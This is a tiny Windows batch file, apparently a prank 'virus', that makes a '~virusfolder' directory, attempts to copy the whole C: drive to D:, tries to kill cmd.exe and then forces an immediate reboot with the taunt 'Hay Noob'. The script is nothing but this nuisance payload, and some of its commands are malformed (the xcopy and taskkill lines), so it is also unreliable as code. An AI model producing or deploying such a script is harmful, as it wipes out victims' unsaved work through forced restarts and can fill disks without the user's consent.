@echo off
md ~virusfolder\path\drive
xcopy C:\*.*D:\
taskkill cmd.exe
start explorer.exe
shutdown -r -t 0 -c "Hay Noob"